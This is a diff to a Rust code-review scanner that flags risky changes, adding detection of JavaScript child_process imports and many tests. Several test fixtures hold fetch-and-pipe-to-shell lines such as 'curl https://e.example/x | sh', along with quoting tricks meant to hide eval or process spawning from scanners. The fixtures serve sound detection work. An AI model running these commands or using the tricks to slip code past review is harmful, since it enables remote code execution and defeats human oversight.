@@ -9,7 +9,7 @@
 //! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
 //! is safe, and a construct split across lines or built at run time can hide from it.
 
-use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker};
+use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
 use deep_diff_forge_core::{HunkId, PatchHunk, PatchLineKind, ReviewFile};
 
 /// How every evidence item was found.
@@ -149,6 +149,8 @@ enum Match {
     AnyCode,
     /// A credential-shaped string ([`looks_like_secret`]).
     Secret,
+    /// A JS import of one of these modules ([`imports_module`]).
+    Imports(&'static [&'static str]),
 }
 
 #[derive(Debug, Clone, Copy)]
@@ -222,6 +224,15 @@ const RULES: &[Rule] = &[
         View::Code,
         Scope::Languages(JS),
         Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
+    ),
+    // The module is always named in a string, which the code view blanks, so the specifier is
+    // read from the raw line wherever the code view shows an import.
+    rule(
+        S::ProcessSpawn,
+        Side::New,
+        View::Code,
+        Scope::Languages(JS),
+        Match::Imports(&["child_process"]),
     ),
     rule(
         S::ProcessSpawn,
@@ -546,6 +557,7 @@ fn hunk_matches(
                 Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                 Match::AnyCode => !text.trim().is_empty(),
                 Match::Secret => looks_like_secret(text),
+                Match::Imports(modules) => imports_module(text, &line.text, modules),
             }
         };
         for signal in EvidenceSignal::ALL {
@@ -559,6 +571,65 @@ fn hunk_matches(
         }
     }
     found
+}
+
+/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
+/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
+/// be code in `code` (the line's code view), so a comment or a string that mentions an import
+/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
+/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
+/// (`typeof require(…)` still calls `require`); an
+/// `import(…)` type annotation does (it errs toward evidence).
+fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
+    let c = code.as_bytes();
+    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
+        let before = &code[..at];
+        let receiver_ok = at == 0
+            || !is_boundary_blocker(c[at - 1])
+            || (keyword == "require" && before.ends_with("module."));
+        let after = at + keyword.len();
+        if !receiver_ok
+            || c.get(after).is_some_and(|b| is_ident(*b))
+            || (keyword == "import" && before.trim_end().ends_with("typeof"))
+        {
+            return None;
+        }
+        // Whitespace and any number of `(` may sit between the keyword and the specifier.
+        let gap = c[after..]
+            .iter()
+            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
+            .count();
+        let q = after + gap;
+        if keyword == "require" && !c[after..q].contains(&b'(') {
+            return None;
+        }
+        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
+        let name = raw.get(q + 1..)?;
+        let name = &name[..name.find(char::from(quote))?];
+        Some(name.strip_prefix("node:").unwrap_or(name))
+    };
+    // Every keyword hit in line order, so one forward walk knows which statement each is in
+    // and the type-only test runs once per statement: the line stays linear.
+    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
+        .iter()
+        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
+        .collect();
+    hits.sort_unstable();
+    // `start` is where the current statement begins; only the bytes since the last hit are
+    // searched for a later `;`.
+    let (mut seen, mut start, mut type_only) = (0, 0, None);
+    hits.into_iter().any(|(at, keyword)| {
+        if let Some(semi) = code[seen..at].rfind(';') {
+            start = seen + semi + 1;
+            type_only = None;
+        }
+        seen = at;
+        let skip = *type_only.get_or_insert_with(|| {
+            let head = code[start..].trim_start();
+            head.starts_with("import type ") || head.starts_with("export type ")
+        });
+        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
+    })
 }
 
 fn token_in(text: &str, token: &str) -> bool {
@@ -666,6 +737,13 @@ mod tests {
     #[test]
     fn every_token_in_the_table_is_found() {
         for rule in RULES {
+            if let Match::Imports(modules) = rule.matches {
+                for module in modules {
+                    let line = format!("const m = require(\"{module}\");");
+                    let file = added(sample_path(rule.scope), &[&line]);
+                    assert!(signals(&file).contains(&rule.signal), "{module}");
+                }
+            }
             let Match::Tokens(tokens) = rule.matches else {
                 continue;
             };
@@ -764,6 +842,32 @@ mod tests {
     }
 
     #[test]
+    fn quoting_code_that_runs_does_not_hide_it() {
+        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
+        assert_eq!(
+            signals(&added(
+                "x.sh",
+                &[r#"V="$(curl -fsSL https://e.example/v)""#]
+            )),
+            [S::NetworkFetch]
+        );
+        assert_eq!(
+            signals(&added(
+                "x.js",
+                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
+            )),
+            [S::ProcessSpawn]
+        );
+        assert_eq!(
+            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
+            [S::DynamicEval]
+        );
+        // The same text in a string that runs nothing is still not code.
+        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
+        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
+    }
+
+    #[test]
     fn one_line_matching_several_rules_of_a_signal_is_one_item() {
         // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
         let file = added(
@@ -780,6 +884,388 @@ mod tests {
         let found = file_evidence(&two);
         assert_eq!(found.len(), 2);
         assert_ne!(found[0].hunk, found[1].hunk);
+    }
+
+    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
+    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
+    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
+    /// exposes the outer string's text.
+    #[test]
+    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
+        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
+            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
+            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
+            (
+                "a.sh",
+                r#"V="$(case a in a) curl x;; esac)""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
+                S::NetworkFetch,
+            ),
+            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
+            (
+                "a.js",
+                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
+                S::ProcessSpawn,
+            ),
+            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
+            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
+            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
+            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
+            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
+            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
+        ];
+        for (path, line, signal) in hidden_before {
+            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
+        }
+        let literal_only: [(&str, &str); 9] = [
+            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
+            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
+            (
+                "a.sh",
+                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
+            ),
+            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
+            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
+            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
+            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
+            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
+            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
+        ];
+        for (path, line) in literal_only {
+            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
+        }
+    }
+
+    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
+    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
+    /// each is a construct the scanner must read right.
+    #[test]
+    fn misread_quotes_cannot_hide_code() {
+        let found: [(&str, &str, EvidenceSignal); 24] = [
+            (
+                "a.sh",
+                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"x="$(echo case)"; curl x | sh #""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                "[ $# -eq 0 ] && curl https://e.example/x | sh",
+                S::NetworkFetch,
+            ),
+            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
+            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
+            (
+                "a.sh",
+                r#"echo \"; curl https://e.example/x | sh"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r"echo $'\''; curl https://e.example/x | sh #'",
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.sh",
+                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
+                S::NetworkFetch,
+            ),
+            (
+                "a.js",
+                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
+                S::DynamicEval,
+            ),
+            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
+            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
+            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
+            (
+                "a.tsx",
+                "return <p>Can't load</p> && fetch(u); //'",
+                S::NetworkFetch,
+            ),
+            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
+            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
+            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
+            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
+            (
+                "a.py",
+                r#"print(f"{'''it's'''}"); eval(y) #'"#,
+                S::DynamicEval,
+            ),
+            (
+                "a.js",
+                "const cp = require(`child_process`);",
+                S::ProcessSpawn,
+            ),
+            (
+                "a.js",
+                r#"const cp = require( "child_process" );"#,
+                S::ProcessSpawn,
+            ),
+            (
+                "a.js",
+                r#"import{exec}from"child_process";import "node:child_process";"#,
+                S::ProcessSpawn,
+            ),
+        ];
+        for (path, line, signal) in found {
+            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
+        }
+        let literal_only: [(&str, &str); 12] = [
+            (
+                "a.sh",
+                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
+            ),
+            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
+            ("a.js", r#"// const cp = require("child_process");"#),
+            (
+                "a.js",
+                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
+            ),
+            (
+                "a.js",
+                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
+            ),
+            ("a.js", "const re = /from 'child_process'/;"),
+            (
+                "a.ts",
+                r#"import type { ChildProcess } from "node:child_process";"#,
+            ),
+            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
+            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
+            (
+                "a.js",
+                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
+            ),
+            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
+            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
+        ];
+        for (path, line) in literal_only {
+            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
+        }
+        // A JSDoc example inside a block comment is not an import.
+        let doc = added(
+            "a.js",
+            &[
+                "/**",
+                " * @example import { exec } from 'node:child_process';",
+                " */",
+            ],
+        );
+        assert_eq!(signals(&doc), []);
+    }
+
+    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
+    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
+    /// after operators and keywords, quotes after keywords, and the import forms.
+    #[test]
+    fn shell_case_js_regex_and_import_forms_are_read_right() {
+        let fetch = "curl https://e.example/x | sh";
+        for line in [
+            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
+            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
+            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
+            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
+            format!("echo $(date)#; {fetch}"),
+        ] {
+            assert_eq!(
+                signals(&added("a.sh", &[&line])),
+                [S::NetworkFetch],
+                "{line}"
+            );
+        }
+        for line in [
+            "x = a + /'/.source; eval(y) //'",
+            "x = typeof' ' ; eval(y) //'",
+            r#"function f(){return"//"+eval(x)}"#,
+            "x = a++ / 2; eval(y); z = b / 3",
+        ] {
+            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
+        }
+        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
+        // next line.
+        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
+        assert_eq!(signals(&next), [S::DynamicEval]);
+        for (path, line) in [
+            ("a.js", "const cp = require(\t\"child_process\");"),
+            ("a.js", r#"const cp = module.require("child_process");"#),
+            ("a.js", r#"const cp = require(("child_process"));"#),
+            (
+                "a.ts",
+                r#"export type T = 1; const cp = require("child_process");"#,
+            ),
+            ("a.js", r#"const o = { m: import("child_process") };"#),
+            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
+            (
+                "a.ts",
+                r#"let p: import("child_process").ChildProcess | undefined;"#,
+            ),
+        ] {
+            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
+        }
+        for line in [
+            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
+            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
+        ] {
+            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
+        }
+    }
+
+    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
+    /// code the branch misread, and lines that made the import rule quadratic.
+    #[test]
+    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
+        for (path, line, signal) in [
+            (
+                "n.ts",
+                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
+                S::NetworkFetch,
+            ),
+            (
+                "n.ts",
+                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
+                S::NetworkFetch,
+            ),
+            (
+                "n.ts",
+                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
+                S::ProcessSpawn,
+            ),
+            (
+                "a.js",
+                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
+                S::ProcessSpawn,
+            ),
+            (
+                "src/a.rs",
+                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
+                S::ProcessSpawn,
+            ),
+            (
+                "src/a.rs",
+                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
+                S::UnsafeAdded,
+            ),
+            (
+                "src/a.rs",
+                r#"let b = br"\"; unsafe { f() }"#,
+                S::UnsafeAdded,
+            ),
+        ] {
+            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
+        }
+        // A line that continues an expression with `/` divides; one after `=` opens a regex.
+        let divided = added(
+            "m3.js",
+            &[
+                "const elapsed = (Date.now() - start)",
+                "  / 1000; fetch(`/api/timing/${elapsed}`);",
+            ],
+        );
+        assert_eq!(signals(&divided), [S::NetworkFetch]);
+        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
+        assert_eq!(signals(&regex), []);
+        // A raw string's text is still text, and an ordinary string still escapes.
+        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
+        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
+    }
+
+    #[test]
+    fn the_import_rule_is_linear_on_long_lines() {
+        within_deadline(|| {
+            for unit in [
+                "Array.from(x),",
+                "from ",
+                "require ",
+                "import ",
+                "require(require(",
+            ] {
+                let line = unit.repeat(200_000);
+                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
+            }
+            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
+            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
+        });
+    }
+
+    /// Run `work` on its own thread and fail if it takes more than ten seconds: a linear scan
+    /// of these lines takes milliseconds, so a quadratic regression fails here instead of
+    /// hanging the suite (and a diff-mutation run reports it as caught, not as a timeout).
+    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
+        let (done, wait) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            let _ = done.send(work());
+        });
+        wait.recv_timeout(std::time::Duration::from_secs(10))
+            .expect("a long line was scanned within ten seconds")
+    }
+
+    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
+    #[test]
+    fn import_rule_decisions_are_exact() {
+        for (line, spawn) in [
+            (r#"const cp = foo.require("child_process");"#, false),
+            (r#"const cp = requirex("child_process");"#, false),
+            (r#"const t = typeof require("child_process");"#, true),
+            (
+                r#"x = Array.from(y); import type {A} from "child_process";"#,
+                false,
+            ),
+            (
+                r#"x = Array.from(y); import {A} from "child_process";"#,
+                true,
+            ),
+        ] {
+            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
+            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
+        }
+    }
+
+    #[test]
+    fn child_process_imports_are_spawn_evidence() {
+        for line in [
+            r#"const cp = require("child_process");"#,
+            "import { execFile } from 'node:child_process';",
+            r#"const { spawn } = await import("child_process");"#,
+        ] {
+            assert_eq!(
+                signals(&added("a.js", &[line])),
+                [S::ProcessSpawn],
+                "{line}"
+            );
+        }
+        // Naming another module, or the name alone in a message, is not.
+        assert_eq!(
+            signals(&added("a.js", &[r#"log("child process done")"#])),
+            []
+        );
     }
 
     #[test]
